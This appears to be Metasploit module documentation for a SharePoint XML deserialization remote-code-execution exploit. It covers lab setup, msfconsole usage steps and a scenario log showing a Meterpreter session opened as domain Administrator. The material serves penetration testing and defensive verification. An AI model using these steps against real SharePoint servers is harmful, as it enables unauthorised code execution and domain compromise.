## Vulnerable Application
A remotely exploitable vulnerability exists within SharePoint that can be leveraged by a remote authenticated attacker
to execute code within the context of the SharePoint application service. The privileges in this execution context are
determined by the account that is specified when SharePoint is installed and configured. The vulnerability is related to
a failure to validate the source of XML input data, leading to an unsafe deserialization operation that can be triggered
from a page that initializes either the `ContactLinksSuggestionsMicroView` type or a derivative of it. In a default
configuration, a Domain User account is sufficient to access SharePoint and exploit this vulnerability.

This module leverages the `/_layouts/15/quicklinks.aspx?Mode=Suggestion` endpoint that was confirmed to be vulnerable by
[Soroush Dalili](https://twitter.com/irsdl). Alternative endpoints that instantiate the
`ContactLinksSuggestionsMicroView` type may be used as well but are not supported by the module.

### Configuring SharePoint
Once SharePoint is installed, it needs to be configured with a site in order to be exploitable. The Central
Administration web interface **is not vulnerable**. To configure SharePoint to be a stand alone server:

1. Install Active Directory and promote the server to be a Domain Controller
    1. Install the "Active Directory Domain Services" role
    1. Promote the server to a Domain Controller in a new forest
    1. Create a Domain User account for testing
1. Install SQL Server Express
1. Run the "SharePoint Products Configuration Wizard"
    1. Use the SQL Server Express instances as the database server
1. In the SharePoint "Central Administration" console web interface:
    1. Verify that there is a web application under the "Manage web applications" page
    1. Create a new "Site Collection" under the "Create site collections" page
        1. Select the previously created web application
        1. Set a Title
        1. Use the default "Team Site" template
        1. Set the "Primary Site Collection Administrator" to the Domain Administrator account

## Verification Steps

1. Install the application and ensure a page is accessible
1. Start msfconsole
1. Do: `use exploit/windows/http/sharepoint_data_deserialization`
1. Set the `RHOSTS`, `USERNAME`, `PASSWORD` and `PAYLOAD` options
1. Set any additional options as required by the previously selected payload
1. Optionally set the `VHOST`, `SSL` and `DOMAIN` options as appropriate
1. Run the exploit

## Options

## Scenarios

### SharePoint 2016 on Server 2016

```
msf5 > use exploit/windows/http/sharepoint_data_deserialization 
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf5 exploit(windows/http/sharepoint_data_deserialization) > set RHOSTS 192.168.63.168
RHOSTS => 192.168.63.168
msf5 exploit(windows/http/sharepoint_data_deserialization) > set RPORT 80
RPORT => 80
msf5 exploit(windows/http/sharepoint_data_deserialization) > set SSL false
[!] Changing the SSL option's value may require changing RPORT!
SSL => false
msf5 exploit(windows/http/sharepoint_data_deserialization) > set VHOST ec2amaz-v2pri0v
VHOST => ec2amaz-v2pri0v
msf5 exploit(windows/http/sharepoint_data_deserialization) > set USERNAME smcintyre
USERNAME => smcintyre
msf5 exploit(windows/http/sharepoint_data_deserialization) > set PASSWORD Password1
PASSWORD => Password1
msf5 exploit(windows/http/sharepoint_data_deserialization) > set DOMAIN SHRPNT
DOMAIN => SHRPNT
msf5 exploit(windows/http/sharepoint_data_deserialization) > set PAYLOAD windows/meterpreter/bind_tcp
PAYLOAD => windows/meterpreter/bind_tcp
msf5 exploit(windows/http/sharepoint_data_deserialization) > check
[*] 192.168.63.168:80 - The service is running, but could not be validated. Received the quicklinks HTML form.
msf5 exploit(windows/http/sharepoint_data_deserialization) > exploit

[*] Executing automatic check (disable AutoCheck to override)
[!] The service is running, but could not be validated. Received the quicklinks HTML form.
[*] Command Stager progress -   7.42% done (7499/101079 bytes)
[*] Command Stager progress -  14.84% done (14998/101079 bytes)
[*] Command Stager progress -  22.26% done (22497/101079 bytes)
[*] Command Stager progress -  29.68% done (29996/101079 bytes)
[*] Command Stager progress -  37.09% done (37495/101079 bytes)
[*] Command Stager progress -  44.51% done (44994/101079 bytes)
[*] Command Stager progress -  51.93% done (52493/101079 bytes)
[*] Command Stager progress -  59.35% done (59992/101079 bytes)
[*] Command Stager progress -  66.77% done (67491/101079 bytes)
[*] Command Stager progress -  74.19% done (74990/101079 bytes)
[*] Command Stager progress -  81.61% done (82489/101079 bytes)
[*] Command Stager progress -  89.03% done (89988/101079 bytes)
[*] Command Stager progress -  96.45% done (97487/101079 bytes)
[*] Command Stager progress - 100.00% done (101079/101079 bytes)
[*] Started bind TCP handler against 192.168.63.168:4444
[*] Sending stage (176195 bytes) to 192.168.63.168
[*] Meterpreter session 1 opened (0.0.0.0:0 -> 192.168.63.168:4444) at 2020-07-29 11:45:13 -0400

meterpreter > sysinfo
Computer        : EC2AMAZ-V2PRI0V
OS              : Windows 2016+ (10.0 Build 14393).
Architecture    : x64
System Language : en_US
Domain          : SHRPNT
Logged On Users : 19
Meterpreter     : x86/windows
meterpreter > getuid
Server username: SHRPNT\Administrator
meterpreter >
```
